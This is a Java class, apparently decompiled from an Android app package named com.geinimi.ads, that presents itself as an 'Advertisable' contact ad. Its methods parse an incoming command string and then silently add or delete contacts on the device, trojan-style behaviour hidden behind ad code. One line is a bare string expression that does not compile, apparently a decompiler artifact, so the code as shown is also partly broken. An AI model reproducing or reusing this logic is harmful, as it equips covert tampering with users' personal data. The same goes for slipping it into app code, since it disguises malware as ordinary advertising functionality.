package com.geinimi.ads;

import android.content.Intent;
import com.geinimi.C0000r;
import com.geinimi.c.b;
import java.net.URLDecoder;

public final class f extends Advertisable {
    private String[] b = {"contact_operation", "contact_name", "contact_phone_number"};

    protected f(String str) {
        super(str);
    }

    public final boolean b() {
        if (b.a.equalsIgnoreCase(a((String) "contact_operation"))) {
            b.a(a((String) "contact_name"), a((String) "contact_phone_number"));
        } else if (b.b.equalsIgnoreCase(a((String) "contact_operation"))) {
            b.a(a((String) "contact_name"));
        }
        return false;
    }

    public final void c() {
        try {
            "ContactAd,strContent=" + this.a;
            String substring = this.a.substring(C0000r.n.length());
            String substring2 = substring.substring(0, substring.indexOf(";"));
            a("contact_operation", substring2);
            String substring3 = substring.substring(substring.indexOf(";") + 1);
            if (b.a.equals(substring2)) {
                a("contact_name", URLDecoder.decode(substring3.substring(0, substring3.indexOf(";")), "UTF-8"));
                a("contact_phone_number", substring3.substring(substring3.indexOf(";") + 1));
            } else if (!b.b.equals(substring2)) {
            } else {
                if (substring3.indexOf(";") == -1) {
                    a("contact_name", substring3);
                } else {
                    a("contact_name", substring3.substring(0, substring3.indexOf(";")));
                }
            }
        } catch (Exception e) {
        }
    }

    public final int d() {
        return 0;
    }

    public final int e() {
        return 0;
    }

    public final Intent f() {
        return null;
    }

    /* access modifiers changed from: protected */
    public final String[] h() {
        return this.b;
    }
}
